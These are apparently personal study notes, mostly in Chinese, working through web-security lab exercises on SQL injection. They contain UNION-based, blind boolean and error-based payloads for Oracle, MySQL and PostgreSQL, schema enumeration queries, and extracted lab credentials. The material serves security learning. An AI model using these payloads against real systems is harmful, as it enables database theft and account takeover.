```
xx'--
```

sql语句中可能有 and released = 1，因为数据库把有的数据隐藏了

```
xx'+or+1=1--
```

查询所有

```
username='xx'--' and password=''
```

颠覆逻辑

```
'union select xxx--
```

检索数据库中数据

```
SELECT * FROM v$version
```

检索数据库信息





ctrl+u：url编码



## SQL injection attack, querying the database type and version on Oracle

' union select 'a',banner from sys.v_$version--+

## SQL injection attack, querying the database type and version on MySQL and Microsoft

?category=Lifestyle' union select 'a',version()--+

## SQL injection attack, listing the database contents on non-Oracle databases

' order by 2--+

' union select 'a',version()--+

=>PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

' union select 'a',schema_name from information_schema.schemata--+

=>

| 'a'  | schema_name        |
| ---- | ------------------ |
| a    | information_schema |
| a    | public             |
| a    | pg_catalog         |

' union select 'a',table_name from information_schema.tables where table_schema='pg_catalog'--+

=>

pg_ts_config_map
pg_constraint                   
pg_tablespace                   
pg_stat_bgwriter                
pg_stat_xact_user_functions     
pg_policy                       
pg_available_extensions         
pg_stat_user_tables             
pg_stat_wal_receiver            
pg_enum                         
pg_sequence                     
pg_stat_progress_create_index   
pg_tables                       
pg_user_mappings                
pg_seclabels                    
pg_auth_members                
pg_stats_ext                    
pg_statio_sys_indexes           
pg_prepared_xacts               
pg_views                        
pg_user                         
pg_stat_xact_sys_tables         
pg_sequences                    
pg_rewrite                      
pg_subscription                 
pg_stat_all_indexes             
pg_shdescription                
pg_stat_gssapi                  
pg_indexes                      
pg_statio_user_sequences        
pg_stat_archiver                
pg_ts_template                  
pg_timezone_names               
pg_foreign_server               
pg_type                         
pg_statio_user_tables           
pg_pltemplate                   
pg_stat_activity                
pg_ts_dict                      
pg_ts_parser                    
pg_extension                    
pg_language                     
pg_group                        
pg_statio_user_indexes          
pg_amop                         
pg_policies                     
pg_replication_slots            
pg_database                     
pg_shdepend                     
pg_publication                 
pg_db_role_setting              
pg_prepared_statements          
pg_stat_database_conflicts      
pg_stat_database                
pg_stat_replication             
pg_stat_xact_user_tables        
pg_statio_sys_sequences         
pg_stat_user_functions          
pg_cast                         
pg_statio_all_tables            
pg_ts_config                    
pg_shseclabel                   
pg_depend                       
pg_stat_all_tables              
pg_attrdef                      
pg_replication_origin           
pg_amproc                       
pg_matviews                     
pg_statio_sys_tables            
pg_event_trigger                
pg_partitioned_table            
pg_am                           
pg_largeobject_metadata         
pg_collation                    
pg_statistic_ext                
pg_class                        
pg_foreign_data_wrapper         
pg_conversion                   
pg_locks                        
pg_stat_sys_tables              
pg_rules                        
pg_index                        
pg_statio_all_indexes           
pg_namespace                    
pg_stat_subscription            
pg_publication_rel              
pg_operator                     
pg_stat_xact_all_tables         
pg_opfamily                     
pg_description                  
pg_stats                       
pg_stat_user_indexes            
pg_opclass                      
pg_range                        
pg_inherits                     
pg_stat_sys_indexes             
pg_stat_progress_vacuum         
pg_available_extension_versions
pg_cursors
pg_aggregate
pg_statio_all_sequences
pg_settings
pg_attribute
pg_stat_progress_cluster
pg_foreign_table
pg_init_privs
pg_stat_ssl
pg_transform
pg_timezone_abbrevs
pg_default_acl
pg_trigger
pg_roles

' union select 'a',column_name from information_schema.columns where table_name='pg_user'--+

用burpsuite的intruder模块批量查表

得到可能得表pg_roles

=>pg_roles:rolname,rolpassword

错了，数据库搞错了

搜表的时候就不该指定数据库，直接搜所有

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

users_lzuqsm

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_lzuqsm'--
```

username_hpqlna

password_wwanrb

```
'+UNION+SELECT+username_hpqlna,+password_wwanrb+FROM+users_lzuqsm--
```

| username      | password             |
| ------------- | -------------------- |
| wiener        | u0djyjuuupomqcyi17qn |
| administrator | hpryjdd0jnp1if96pb8h |

## SQL injection attack, listing the database contents on Oracle

```
' union select table_name,null from all_tables--+
```

表名：USERS_LMQRSC

```
' union select column_name,null from all_tab_columns where table_name='USERS_LMQRSC'--+
```

列名：PASSWORD_TZEGWA	USERNAME_GWTBKN

```
' union select USERNAME_GWTBKN,PASSWORD_TZEGWA from USERS_LMQRSC--+
```

| 用户名        | 密码                 |
| ------------- | -------------------- |
| administrator | p1dqqm7fsg5c3pd9rds8 |

all_tables为存表名的表

all_tab_columns为存表名和列名的表

## Blind SQL injection with conditional responses

cookie注入：请求的cookie 若数据库中已存在，则返回welcome back，不存在则不返回welcome back

```
Cookie: TrackingId=zE4fYn2IqMbic6HN' and 1=1--; session=nLV9bknvkhGTOrDyqI1nksB6uG2p8JWy
```

```
' and (select 'a' from users)='a'--
```

存在表user

```
' and (select 'a' from users where username='administrator')='a'--
```

user中存在用户administrator

```
' and (select 'a' from users where username='administrator' and length(password)>1)='a'--
```

从1开始，判断password位数，为20

```
' and (select substring(password,1,1) from users where username='administrator')='a'--
```

用intruder爆破，由于有两个参数要变，使用Cluster bomb

密码为zb7woiar9rmdzfcimmk3

## Blind SQL injection with conditional errors

报错注入：cookie可注入，且cookie有错的时候会报错

```
Cookie: TrackingId=zPiORxXsaSfDbOIc'
```

报错，且500，说明是后端错误

```
Cookie: TrackingId=zPiORxXsaSfDbOIc''
```

不报错，说明这里的可以影响输出

```
' union select ''--+
```

加入一个正确的sql语句，显示报错，可能是oracle数据库

```
' union select '' from dual--+
或' and (select 'a' from dual)='a'--+
```

输出正常页面，说明是个oracle数据库，且此处与数据库交互

```
' and (select 'a' from users where rownum=1)='a'--+
```

表示user表存在

疑问：为什么此处查dual表不用rownum，查user必须用？而且加了查询子句where之后，也不用rownum了

```
' and (select 'a' from users where username='administrator')='a'--
```

